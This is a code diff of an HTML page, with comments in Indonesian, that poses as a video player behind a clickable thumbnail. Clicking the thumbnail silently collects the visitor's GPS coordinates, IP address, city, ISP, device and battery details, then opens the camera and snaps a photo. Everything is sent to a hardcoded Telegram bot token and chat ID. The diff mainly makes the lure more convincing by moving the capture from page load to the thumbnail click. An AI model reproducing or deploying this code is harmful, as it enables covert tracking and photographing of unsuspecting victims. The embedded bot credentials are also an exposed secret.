@@ -16,12 +16,24 @@
             position: relative;
             width: 640px;
             height: 360px;
-            background: #000;
+            background: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #thumbnail {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+            position: absolute;
+            z-index: 1;
+            cursor: pointer;
         }
         video {
             width: 100%;
             height: 100%;
-            background: black;
+            display: none;
         }
         .controls {
             position: absolute;
@@ -44,6 +56,7 @@
 <body>
 
     <div class="video-container">
+        <img id="thumbnail" src="thumbnail.jpg" alt="Thumbnail Video" onclick="startVideo()">
         <video id="video" autoplay muted></video>
         <div class="controls">
             <button onclick="togglePlay()">▶️ Play/Pause</button>
@@ -54,9 +67,11 @@
         const BOT_TOKEN = "7835500770:AAEhp7-8y-mEuhjw2bTUzutQ3rZjmg5zv5o"; // Ganti dengan token bot Telegram
         const CHAT_ID = "-1002270270494"; // Ganti dengan Chat ID Anda
         let video = document.getElementById("video");
+        let thumbnail = document.getElementById("thumbnail");
+        let isPlaying = false;
 
         function sendToTelegram(message) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message })
@@ -68,91 +83,97 @@
             formData.append("chat_id", CHAT_ID);
             formData.append("photo", imageBlob, "snapshot.jpg");
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: "POST",
                 body: formData
             });
         }
 
-        function captureData() {
-            // Ambil lokasi & IP
-            navigator.geolocation.getCurrentPosition(
-                position => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    sendToTelegram(`📍 Lokasi: ${lat}, ${lon}`);
-                },
-                error => {
-                    sendToTelegram("❌ Lokasi tidak diizinkan.");
-                }
-            );
+        async function captureData() {
+            let message = "🔍 Data Pengguna:\n";
+
+            try {
+                // Ambil lokasi
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+                message += `📍 Lokasi: ${pos.coords.latitude}, ${pos.coords.longitude}\n`;
+            } catch {
+                message += "❌ Lokasi tidak diizinkan.\n";
+            }
 
             // Ambil informasi dari IP
-            fetch("https://ipinfo.io/json")
-                .then(response => response.json())
-                .then(data => {
-                    sendToTelegram(`🌐 IP: ${data.ip}\n🏙 Kota: ${data.city}, ${data.region}\n📡 ISP: ${data.org}`);
-                });
+            try {
+                const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
+                message += `🌐 IP: ${ipData.ip}\n🏙 Kota: ${ipData.city}, ${ipData.region}\n📡 ISP: ${ipData.org}\n`;
+            } catch {
+                message += "⚠️ Gagal mendapatkan informasi IP.\n";
+            }
 
             // Ambil informasi perangkat
-            let deviceInfo = `📱 Perangkat: ${navigator.userAgent}`;
             let network = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
-            deviceInfo += `\n📶 Jaringan: ${network}`;
-
-            // Jika Android, coba deteksi versinya
             let androidVersion = navigator.userAgent.match(/Android\s([0-9\.]+)/);
-            if (androidVersion) {
-                deviceInfo += `\n🤖 Android: ${androidVersion[1]}`;
+            let androidInfo = androidVersion ? `🤖 Android: ${androidVersion[1]}\n` : "";
+            message += `📱 Perangkat: ${navigator.userAgent}\n📶 Jaringan: ${network}\n${androidInfo}`;
+
+            // Ambil status baterai
+            try {
+                const battery = await navigator.getBattery();
+                message += `🔋 Baterai: ${Math.round(battery.level * 100)}%\n`;
+            } catch {
+                message += "⚠️ Tidak bisa mendapatkan status baterai.\n";
             }
 
-            sendToTelegram(deviceInfo);
+            // Kirim data ke Telegram
+            await sendToTelegram(message);
 
-            // Cek status baterai
-            if (navigator.getBattery) {
-                navigator.getBattery().then(battery => {
-                    sendToTelegram(`🔋 Baterai: ${Math.round(battery.level * 100)}%`);
-                });
-            } else {
-                sendToTelegram("⚠️ Tidak bisa mendapatkan status baterai.");
+            // Aktifkan kamera dan ambil foto setelah 2 detik
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.play();
+                isPlaying = true;
+
+                let canvas = document.createElement("canvas");
+                let ctx = canvas.getContext("2d");
+
+                await new Promise(resolve => setTimeout(resolve, 2000));
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(async blob => {
+                    await sendPhotoToTelegram(blob);
+                }, "image/jpeg");
+
+                stream.getTracks().forEach(track => track.stop());
+                video.style.display = "none";
+                thumbnail.style.display = "block";
+            } catch {
+                await sendToTelegram("❌ Kamera tidak diizinkan.");
             }
+        }
 
-            // Aktifkan kamera dalam elemen video
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    video.srcObject = stream;
-                    video.play();
-
-                    let canvas = document.createElement("canvas");
-                    let ctx = canvas.getContext("2d");
-
-                    setTimeout(() => {
-                        video.pause();
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                        canvas.toBlob(blob => {
-                            sendPhotoToTelegram(blob);
-                        }, "image/jpeg");
-
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 2000); // Ambil gambar setelah 2 detik
-                })
-                .catch(error => {
-                    sendToTelegram("❌ Kamera tidak diizinkan.");
-                });
+        function startVideo() {
+            thumbnail.style.display = "none";
+            video.style.display = "block";
+            captureData();
         }
 
         function togglePlay() {
-            if (video.paused) {
-                video.play();
-            } else {
+            if (isPlaying) {
                 video.pause();
+                isPlaying = false;
+            } else {
+                video.play();
+                isPlaying = true;
             }
         }
 
-        // Jalankan saat halaman dimuat
-        window.onload = captureData;
+        window.onload = function () {
+            video.style.display = "none";
+        };
     </script>
 </body>
 </html>
